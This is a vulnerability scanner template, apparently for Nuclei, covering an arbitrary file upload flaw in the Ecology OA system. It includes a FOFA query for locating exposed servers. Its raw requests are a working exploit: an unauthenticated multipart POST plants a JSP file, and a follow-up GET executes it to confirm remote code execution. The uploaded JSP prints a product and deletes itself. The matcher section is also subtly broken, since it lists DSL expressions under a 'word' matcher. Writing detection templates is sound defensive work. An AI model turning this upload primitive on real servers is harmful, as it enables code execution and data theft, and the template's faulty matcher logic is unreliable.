id: ecology-arbitrary-file-upload
info:
  name: Ecology - Arbitrary File Upload
  author: ritikchaddha
  severity: critical
  description: Ecology has an arbitrary file upload vulnerability that can be exploited
    by an attacker to execute code, modify data, and access sensitive information.
  reference:
  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
    impact: The impact of the arbitrary file upload vulnerability in Ecology can lead
      to an attacker gaining access to sensitive information, modifying data, and
      executing unauthorized operations.
    recommendation: It is highly recommended to patch the arbitrary file upload vulnerability
      in Ecology to prevent attackers from accessing sensitive information, modifying
      data, or executing unauthorized operations.
  tags: ecology,upload,fileupload,intrusive
requests:
- raw:
  - 'POST /page/exportImport/uploadOperation.jsp HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo


    ------WebKitFormBoundaryFy3iNVBftjP6IOwo

    Content-Disposition: form-data; name="file"; filename="{{randstr}}.jsp"

    Content-Type: application/octet-stream


    <%out.print(364536*876356);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ------WebKitFormBoundaryFy3iNVBftjP6IOwo--

    '
  - 'GET /page/exportImport/fileTransfer/{{randstr}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
  req-condition: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - status_code_1 == 200
    - contains(body_2, '319463310816') || status_code_2 == 200
    condition: and
